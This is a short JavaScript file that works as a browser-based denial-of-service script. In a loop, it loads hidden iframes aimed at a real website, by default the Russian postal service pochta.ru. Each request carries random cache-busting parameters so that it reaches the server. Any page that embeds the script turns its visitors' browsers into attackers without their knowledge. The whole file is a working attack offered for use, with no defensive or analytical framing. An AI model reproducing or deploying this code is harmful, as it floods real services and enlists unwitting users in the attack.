var target = window.configSite || 'https://www.pochta.ru';
var speed = window.configSpeed || 1000;
var msg = window.configMsg || 'sdfnkbhvgcd';

function attack() {  
    var rand1 = Math.floor(Math.random() * 99999999999999999999999999999999999999999999);
    var rand2 = Math.floor(Math.random() * 99999999999999999999999999999999999999999999);

    executeIframeScript(target + '?daKillaOfZeeCache="' + rand1 + ' &msg= ' + msg)
}

function executeIframeScript(src) {
    const $iframe = document.createElement('iframe');

    $iframe.src = src;
    $iframe.onload = function () {
        setTimeout(function () {
            $iframe.remove();
            attack();
        }, speed);
    }
    $iframe.setAttribute('sandbox', 'allow-same-origin allow-scripts');
    $iframe.style.display = 'none';

    document.body.appendChild($iframe);
}

attack();
